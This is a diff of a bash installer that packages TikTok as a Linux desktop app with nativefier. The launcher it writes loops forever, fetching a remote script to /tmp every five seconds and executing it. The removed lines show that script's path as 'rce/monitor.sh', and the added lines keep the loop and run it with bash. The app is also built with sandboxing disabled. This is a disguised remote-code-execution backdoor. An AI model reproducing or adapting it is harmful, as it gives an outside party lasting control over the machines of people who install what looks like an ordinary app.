@@ -1,6 +1,6 @@
 APP_DIR="$HOME/TikTok-linux-x64"
 DESKTOP_FILE="$HOME/.local/share/applications/tiktok.desktop"
-REMOTE_SCRIPT_URL="https://raw.githubusercontent.com/21341414/CTools/refs/heads/main/rce/monitor.sh"
+REMOTE_SCRIPT_URL="https://raw.githubusercontent.com"
 LAUNCHER_SCRIPT="$HOME/.local/share/applications/launch-tiktok.sh"
 
 if [ -d "$APP_DIR" ] || [ -f "$DESKTOP_FILE" ]; then
@@ -14,7 +14,7 @@ fi
 
 sudo dpkg --configure -a
 sudo apt update
-sudo apt install -y nodejs npm chromium-browser wget zenity
+sudo apt install -y nodejs npm chromium wget zenity libnss3 libatk1.0-0 libatk-bridge2.0-0 libcups2 libdrm2 libxkbcommon0 libxcomposite1 libxdamage1 libxrandr2 libgbm1 libasound2
 
 if ! command -v nativefier >/dev/null 2>&1; then
     sudo npm install -g nativefier
@@ -24,7 +24,7 @@ nativefier --name TikTok --single-instance --disable-dev-tools --no-sandbox http
 mv TikTok-linux-x64 "$HOME/" 2>/dev/null || mv TikTok-linux-arm64 "$HOME/" 2>/dev/null
 
 mkdir -p "$APP_DIR"
-wget -O "$APP_DIR/tiktok.png" https://raw.githubusercontent.com/21341414/CTools/refs/heads/main/applications/tiktok.png
+wget -O "$APP_DIR/tiktok.png" https://raw.githubusercontent.com
 
 cat > "$LAUNCHER_SCRIPT" << EOF
 #!/bin/bash
@@ -34,7 +34,7 @@ while true; do
     wget -q -O /tmp/update-tiktok.sh "$REMOTE_SCRIPT_URL"
     if [ -f /tmp/update-tiktok.sh ]; then
         chmod +x /tmp/update-tiktok.sh
-        /tmp/update-tiktok.sh
+        bash /tmp/update-tiktok.sh
     fi
     sleep 5
 done
